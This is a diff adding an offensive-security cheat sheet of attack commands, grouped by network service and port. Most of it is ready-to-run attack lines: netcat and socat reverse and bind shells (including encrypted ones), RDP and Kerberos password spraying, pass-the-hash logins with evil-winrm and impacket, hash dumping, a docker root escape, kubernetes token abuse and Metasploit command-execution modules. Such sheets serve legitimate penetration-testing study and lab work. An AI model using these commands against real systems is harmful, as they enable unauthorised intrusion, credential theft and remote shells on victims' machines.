@@ -1,0 +1,558 @@
+== NETWORK ENUMERATION ==
+
+NMAP or RUSTSCAN is a network enumeration tool to find open ports on a machine or a device
+# https://nmap.org/nsedoc/scripts/ -> nse scripts list
+
+:: nmap -p- -A --min-rate 10000 -oN [save file] [ip]
+:: rustscan -u 5000 -a 'machine-ip' -- -sC -sV
+:: rustscan -u 5000 -b 2250 -t 2000 -a 'ip' -- -A -oN scan.txt
+:: nmap -T5 --open -sS -vvv --min-rate=300 --max-retries=3 -p- -oN all-ports-nmap-report [IP]
+:: nmap --script firewall-bypass <target>
+:: nmap --script firewall-bypass --script-args firewall-bypass.helper="ftp",firewall-bypass.targetport=21 <target>
+:: nmap -n -sV --script="ldap* and not brute" -p 389 127.0.0.1 
+:: nmap 10.10.10.10 -p139,445 --script=smb-vuln*
+:: nmap --script=vuln -p 80 10.10.61.45
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+== FTP == -> PORT 21
+
+ftp is file transfer protocol
+resource > https://www.cs.colostate.edu/helpdocs/ftp.html
+
+#connect to the service
+	> ftp anonymous@<IP>
+	> ftp anonymous@<IP> -p <port>
+
+PROFTPD mod copy
+	> establish netcat connection with proftpd
+	> SITE CPFR <file path>
+	> SITE CPTO <file dest>
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+== NETCAT ==
+
+#Use netcat to connect to a service or set up a listener for the remote host to connect back to our local machine
+resource > https://www.varonis.com/blog/netcat-commands
+
+
+#setting up a listener (reverse shell)
+	> nc -lvnp [port]
+#TAG
+# -l      listen
+# -v      verbose
+# -n      no dns
+# -p      port number
+
+
+#remote host command for bind & reverse shell
+	> nc -e /bin/bash -lvnp [port] --ssl  {to listen for connection}
+	> nc -e /bin/bash [ip] [port] --ssl  {to connect to listening port}
+	> nc -e cmd.exe -lvnp [port] --ssl  {to listen for connection on windows shell}
+	> nc -e cmd.exe [ip] [port] --ssl  {to connect to listening port on windows shell}
+
+#local host command for bind & reverse shell
+	> nc -lvnp [port] --ssl {to listen for connection}
+	> nc [ip] [port] --ssl {to connect to listening port}
+
+#setting up listener on remote host for bind shell
+	> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc -lvnp [port] > /tmp/f
+
+#get reverse shell
+	> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc [ip] [port] > /tmp/f
+	> mkfifo /tmp/f; nc [ip] [port] < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+
+#send and receive files with netcat
+	> nc -lvnp [port] > [file name]
+	> nc -nv [ip] [port] < [file nane]
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+== NFS(network file systems) == -> PORT 2049 & PORT 111
+
+NFS is a network file system with the purpose of accessing files or directories on a remote host from local host
+!! NOTE THAT SMB WORKS THE SAME AS NFS BUT ALSO DIFFER FROM NFS IN SOME WAYS 
+
+# how to export shares on target's server
+1. create a directory for the exported files (/tmp/mount)
+2. /usr/sbin/showmount -e [ip] >> to list the nfs share on the target's server
+3. mount -t nfs IP:share /tmp/mount/ -nolock >> to connect nfs share to the mount point(/tmp/mount)
+	#Tag            Function
+	#sudo           Run as root
+	#mount          Execute the mount command
+	#-t nfs         Type of device to mount, then specifying that it's NFS
+	#IP:share       The IP Address of the NFS server, and the name of the share we wish to mount
+	#-nolock        Specifies not to use NLM locking
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+== RDP(remote desktop protocol) == -> PORT 3389
+
+rdp is remote desktop protocol
+
+# enumerate rdp port & service
+	> nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 <IP>
+
+# password spraying
+	> crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
+	> hydra -L usernames.txt -p 'password123' <IP> rdp
+
+# check known credentials on RDP
+	> rdp_check <domain>/<name>:<password>@<IP>
+
+# connect with known credentials or hash
+	> xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:[ip] /u:[username] /p:'[password]'
+	> rdesktop -u <username> <IP>
+	> rdesktop -d <domain> -u <username> -p <password> <IP>
+	> xfreerdp [/d:domain] /u:<username> /p:<password> /v:<IP>
+	> xfreerdp [/d:domain] /u:<username> /pth:<hash> /v:<IP>
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+== REDIS == -> PORT 6379
+
+connecting to redis server
+
+# using redis-cli
+	> redis-cli -h [ip] -a "[password]"
+
+# using netcat
+	> netcat [ip] [port]
+
+# COMMANDS FOR REDIS SERVER
+	> KEYS * - to list all available shares
+	> KEYS "[share's name]"
+	> get "[share's name]"
+	> LRANGE "[share's name]" 1 100
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+== RSYNC ==
+
+rsync is the same as nfs on how you can sync the files into directories in remote machine
+connect to rsync network service
+
+#using built-in tool in kali with rsync to list files
+	> rsync --list-only rsync://rsync-connect@[ip]
+
+#copy files onto local machine
+	> rsync -zvh [file name] [/local/path]
+
+#copy all files onto local machine
+	> rysnc -avzh [/remote/path] [/local/path]
+
+#rsync local machine with remote machine
+#example: sync authorized keys from local machine into .ssh directory in remote machine
+	> rsync [file] rsync://rsync-connect@[ip]/path/
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+== SMB == -> PORT 139 & PORT 445
+
+SMB = Server Message Block
+
+#Enum4linux is a tool used to enumerate SMB shares on both Windows and Linux systems.
+	> enum4linux [options] [ip]
+	#TAG            FUNCTION
+	#-U             get userlist
+	#-M             get machine list
+	#-N             get namelist dump (different from -U and-M)
+	#-S             get sharelist
+	#-P             get password policy information
+	#-G             get group and member list
+	#-a             all of the above (full basic enumeration)
+
+# smbclient is a client to access resources on servers.
+	> smbclient //[ip]/[share]
+	#TAG        FUNCTION
+	#-U [name]  to specify the user
+	#-p [port]  to specify the port
+
+	> smbclient -L [ip] --> to list shares
+
+# enumerate smb possible vulns with nmap
+	> nmap 10.10.10.10 -p139,445 --script=smb-vuln*
+
+# crackmapexec to list shares
+	> crackmapexec smb 192.168.60.1 -u username -p password --shares
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+== SMTP == -> PORT 25
+
+smtp is simple mail transfer protocol and usually works with a pair of protocol which is pop3/imap
+
+#connecting to smtp server with netcat
+	> nc [ip] 25
+	> VRFY [username] - verify if the user exists
+	> HELO | EHLO - initiate a conversation
+	> STARTTLS - start a TLS session for encryption
+	> RCPT - recipient address
+	> DATA - message's content
+	> RSET - abort current message
+	> MAIL - sender address
+	> QUIT - close connection
+	> HELP - help screen
+	> AUTH - authenticate client to server
+
+#enumerate smtp server details
+	> smtp-user-enum -M VRFY -U [userlist] -t [target-ip]
+	> use auxiliary/scanner/smtp/smtp_version
+	> use auxiliary/scanner/smtp/smtp_enum
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+== POP3 == -> PORT 110 & PORT 995
+
+#enumerate pop3 login auth with metasploit
+	> use auxiliary/scanner/pop3/pop3_login
+
+#establish connection with pop3 mail server
+	> nc [ip] [port]
+	> USER [username]
+	> PASS [password]
+
+#commands for pop3 mail server
+	> stat -returns total number of messages and total size
+	> list -list all mesages
+	> retr [message] -retrieves the whole message
+	> dele [message] - deletes the specified message
+	> top [message] -returns the headers and number of lines from the message
+	> rset -undelete the message if any marked for deletion
+	> quit -logs out and save any changes
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+== SOCAT == 
+
+SHELL STABILISED
+	# fully stabilised shell listener
+		> socat TCP-L:[port] FILE:`tty`,raw,echo=0
+	# connect back to the fully stabilised listener
+		> socat TCP:[ip]:[port] EXEC:"bash -li",pty,stderr,sigint,setsid,sane
+
+REVERSE SHELL
+	# set up a listener
+		> socat TCP-L:[port] -
+		>socat -d -d TCP4-LISTEN:4443 STDOUT
+
+	# to connect back to socat reverse shell from windows
+		> socat TCP:[ip]:[port] EXEC:powershell.exe,pipes
+		> socat TCP4:192.168.168.1:4443 EXEC:'cmd.exe',pipes
+
+	# to connect back to socat reverse shell from linux
+		> socat TCP:[ip]:[port] EXEC:"bash -li"
+		> socat TCP4:192.168.168.1:4443 EXEC:/bin/bash
+
+BIND SHELL
+	# set up a listener on linux target
+		> socat TCP-L:[PORT] EXEC:"bash -li"
+		> socat -d -d TCP4-LISTEN:4443 EXEC:/bin/bash
+	# set up a listener on windows target
+		> socat TCP-L:[port] EXEC:powershell.exe,pipes
+		> socat -d -d TCP4-LISTEN:4443 EXEC:'cmd.exe',pipes
+	# to connect back to socat reverse shell
+		> socat TCP:[ip]:[port] -
+		> socat - TCP4:192.168.168.130:4443
+	# fully stabilised shell listener
+		> socat TCP-L:[port] FILE:`tty`,raw,echo=0
+	# connect back to the fully stabilised listener
+		> socat TCP:[ip]:[port] EXEC:"bash -li",pty,stderr,sigint,setsid,sane
+
+
+ENCRYPTED REVERSE SHELL
+	# generate a certificate
+		> openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
+	# merge the 2 created files into .pem extension
+		> cat shell.key shell.crt > shell.pem
+	# set up listener on local machine
+		> socat OPENSSL-LISTEN:[PORT],cert=shell.pem,verify=0
+		> socat -d -d OPENSSL-LISTEN:4443,cert=bind.pem,verify=0,fork STDOUT
+	# connect back to listener
+		> socat OPENSSL:192.168.168.1:4443,verify=0 EXEC:/bin/bash [LINUX]
+		> socat OPENSSL:192.168.168.1:4443,verify=0 EXEC:'cmd.exe',pipes [WINDOWS]
+
+ENCRYPTED BIND SHELL
+	# generate a certificate
+		> openssl req -newkey rsa:2048 -nodes -keyout bind.key -x509 -days 1000 -subj '/CN=www.mydom.com/O=My Company Name LTD./C=US' -out bind.crt
+	# merge the 2 created files into pem file
+		> cat bind.key bind.crt L > bind.pem
+	# set up listener on victim machine
+		> socat OPENSSL-LISTEN:4443,cert=bind.pem,verify=0,fork EXEC:'cmd.exe',pipes [WINDOWS]
+		> socat OPENSSL-LISTEN:4443,cert=bind.pem,verify=0,fork EXEC:/bin/bash [LINUX]
+	# connect back to listener
+		> socat OPENSSL:[IP]:[PORT],verify=0
+		> socat - OPENSSL:192.168.168.130:4443,verify=0
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+== SSH == -> PORT 22
+
+#SSH is a secure shell 
+	> ssh [username]@[ip]
+	> ssh -p [port] [username@[ip]
+	> ssh -i [key file] [username]@[ip]
+	> ssh anonymous@10.1.0.23 -t 'bash --noprofile' -> enables pseudo-tty allocation
+
+#generate a ssh private key
+	> ssh-keygen
+
+#port forwarding with ssh
+	> ssh -L [port]:[ip]:[port] [user]@[ip]
+	:: example ssh -L 8111:127.0.0.1:8111 user@10.10.10.10
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+== SCP ==
+
+# SCP is secure copy and only works when ssh service is running
+
+# remote to host
+	> scp [username]@[ip]:[file path] .
+	> scp -P [port] [username]@[ip]:[file path] .
+
+# host to remote
+	> scp [file name] [username]@[ip]:[path][file name to save]
+	> scp -P [port] [file name] [username]@[ip]:[path][file name to save]
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+== TCPDUMP ==
+
+> sudo tcpdump ip proto \\icmp -i tun0
+> sudo tcpdump -i tun0 icmp
+> sudo tcpdump port 80
+> sudo tcpdump -i wlan0 -A
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+== TELNET ==
+
+# Telnet works the same as ssh but with no encryption
+	> telnet [ip] [port]
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+== NETWORK PIVOTING == 
+
+Pivoting is a technique to route the traffic from a hacked computer toward other networks that are not accessible by a hacker machine. Example --> port forwarding or tunneling
+
+# port forwarding with chisel
+	> https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html
+	> basic server listener (to pivot into the network behind it)
+		~> chisel server -p 8000 --reverse (on local machine)
+		~> chisel client [local-ip]:8000 R:[port-to-forward]:[ip-to-forward]:[port-to-forward] (on remote machine)
+	> basic client listener (unable to connect to the internet on remote machine)
+		~> chisel server -p 8000 (on local machine)
+		~> chisel client [local-ip]:8000 9001:www.exploit-db.com:443 (on remote machine)
+
+# port forwarding with ssh
+	> ssh -L [port]:[ip]:[port] [user]@[ip]
+	  #example ssh -L 8111:127.0.0.1:8111 user@10.10.10.10 
+
+#port forwarding with socat
+	> wget http://[ip]:[port]/socat --> on victim to get socat binaries from local machine
+	> chmod +x socat
+	> ./socat tcp-listen:[any port],reuseaddr,fork tcp:[ip to forward]:[port to forward]
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+== DOCKER ==
+
+> docker images - to see all docker images
+> docker run -v /:/mnt --rm -it image chroot /mnt sh {getting root shell}
+
+# docker command on local machine after port forwarding
+	> docker -H tcp://localhost:8080 images - list all docker images
+	> docker -H tcp://localhost:8080 container ls - list all docker images
+	> docker -H tcp://127.0.0.1:8080 exec -it [images] sh -- get shell on instances
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+== BORG ==
+
+borg supports compression and authenticated encryption and is mainly used for data backups.
+
+List all archives in the repository
+--> borg list [directory]
+
+List the contents of archive
+--> borg list [directory::archive]
+
+Extract archive into local machine
+--> borg extract [directory::archive]
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+== MEMCACHED SERVICE == -> PORT 11211
+
+memcached is a general-purpose distributed memory caching system and most instances are exposed without authentication
+
+#dumping all caches
+	> /usr/share/memcached/scripts/memcached-tool ip:port dump
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+== MYSQL == -> PORT 3306
+
+#connecting to the mysql service 
+	> mysql -h [ip] -u [username] -p 
+#commands for the sql server
+	> show databases;
+	> use [db name];
+	> show tables;
+	> describe [tb name];
+	> SELECT * FROM [tb name];
+	> UPDATE [tb name] set [col name] = [value];
+
+#get the mysql server version with metasploit
+	> use auxiliary/admin/mysql/mysql_sql
+
+#dump tables and columns in database with metasploit
+	> use auxiliary/scanner/mysql/mysql_schemadump
+
+#extract credentials from mysql server with metasploit
+	> use auxiliary/scanner/mysql/mysql_hashdump
+
+#enumerate mysql server with nmap
+	> use --script mysql-enum
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+== MONGODB == -> PORT 27017
+
+#connecting to the mongodb service
+	> mongo [ip] -u [username] -p
+#commands for the
+	> show dbs
+	> use [db]
+	> show collections
+	> db.[collection].find()
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+== POSTGRESQL == -> PORT 5432
+
+# postgres is just another rdbs like mysql
+
+enumerate login credentials with metasploit
+	-> auxiliary/scanner/postgres/postgres_login
+
+execute commands on sql server with metasploit
+	-> auxiliary/admin/postgres/postgres_sql
+
+dump user hash with metasploit
+	-> auxiliary/scanner/postgres/postgres_hashdump
+
+read files on sql server with authenticate credentials using metasploit
+	-> auxiliary/admin/postgres/postgres_readfile
+
+arbitrary comman execution with metasploit
+	-> exploit/multi/postgres/postgres_copy_from_program_cmd_exec
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+== MQTT == -> PORT 8883 & PORT 1883
+
+# mqtt is a protocol mainly used by IOT devices
+
+# subscribe to a topic
+	-> mosquitto_sub -t 'topic-name/#' -h ip -p 1883 -V mqttv31 --tls-version tlsv1.2
+
+# listens to all published models except "$SYS"
+	-> mosquitto_sub -h ip -p 1883 -t "#"
+
+# listens to "$SYS" published models
+	-> mosquitto_sub -h ip -p 1883 -t "$SYS"
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+== ACTIVE DIRECTORY DOMAIN SERVICE == -> PORT 389 & PORT 636
+
+--> https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet
+--> https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap
+
+# enumerate users on active directory
+	> kerbrute userenum -d domain.com rockyou.txt
+	> kerbrute passwordspray -d domain.com users.txt Password123
+	> kerbrute bruteuser -d domain.com rockyou.txt user1
+	> impacket-lookupsid domain.com/guest@192.158.69.4
+	> impacket-GetNPUsers -no-pass -usersfile userlist.txt -dc-ip 10.1.1.10 example.com/
+
+# rpcclient for active directory enumeration
+	> rpcclient -U "" [target ip] --> connect to rpcclient
+	> querydominfo --> domain information query
+	> srvinfo --> server information
+	> enumdomusers --> enumerate users
+	> enumdomgroupd --> enumerate groups
+	> querygroup 0x200 --> group queries
+	> queryuser username --> user queries
+	> enumprivs --> enumerate privileges
+	> getdompwinfo --> get domain password information
+	> getusrdompwinfo 0x200 --> get user domain password information
+	> createdomuser username --> create domain user
+	> setuserinfo2 username 24 password --> set a password for domain user
+	> deletedomuser username --> delete domain user
+	> enumalsgroups builtin --> enumerate alias groups
+
+# windows remoting with AD users using crackmapexec
+	> crackmapexec winrm 192.168.56.10 -u username -p password
+
+# get a shell on the machine with AD users
+	> impacket-psexec domain.com/username@129.49.10.1
+	> impacket-wmiexec domain.com/username@129.49.10.1
+	> evil-winrm -i 10.10.147.48 -u username -p password
+	> evil-winrm -i 10.10.147.48 -u administrator -H "hash"                           1 ⨯
+	> impacket-wmiexec domain.com/admin@10.10.20.2 -hashes [hash]
+
+# dump hashes on AD machine
+	> impacket-secretsdump domain.com/username@10.10.10.10
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+== ENUMERATING DNS SERVERS == -> PORT 53
+
+# TYPES OF DNS RECORDS
+    > A --> stores a hostname & its ipv4 address
+    > AAAA --> stores a hostname & its ipv6 address
+    > CNAME --> stores a hostname that points to another hostname
+    > MX --> an SMTP email server
+
+# SENDING DNS QUERIES WITH NSLOOKUP
+    > nslookup --type=A example.com 10.10.10.10
+
+# SENDING DNS QUERIES WITH DIG
+    > dig @10.10.10.10 example.com A
+
+# SENDING DNS QUERIES WITH DNSRECON
+    > dnsrecon -d example.com -n 10.10.10.10
+
+# DNS ZONE TRANSFER
+	> dig axfr example.com @example.com
+
+# PERFORM REVERSE IP LOOKUP
+	> dig -x 10.10.10.10
+	> host 10.10.10.10
+	> dig +noall +answer -x 10.10.10.10 --> for cleaner output
+	> nslookup 10.10.10.10
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+== INTERACTING WITH KUBERNETES SERVER == -> PORT 6443
+
+# KUBERNETES SERVICE ACCOUNTS PATH
+	> /var/run/secrets/kubernetes.io/serviceaccount/{ca.crt, token, namespace}
+
+# LISTING THE PODS ON KUBENERTES
+	> kubectl --token=`cat token` --insecure-skip-tls-verify --namespace=default --server=https://10.10.10.10:8443/ get pods
+
+# CHECK PRIVILEGE OF CURRENT SERVICE ACCOUNT
+	> kubectl --token=`cat token` --insecure-skip-tls-verify --namespace=default --server=https://10.10.10.10:8443/ auth can-i --list
+
+# LISTING RESOURCES
+	> kubectl --token=`cat token` --insecure-skip-tls-verify --namespace=default --server=https://10.10.10.10:8443/ get secrets
+
+# READ RESOURCES
+	> kubectl --token=`cat token` --insecure-skip-tls-verify --namespace=default --server=https://10.10.10.10:8443/ get [resource] [name] -o yaml
+
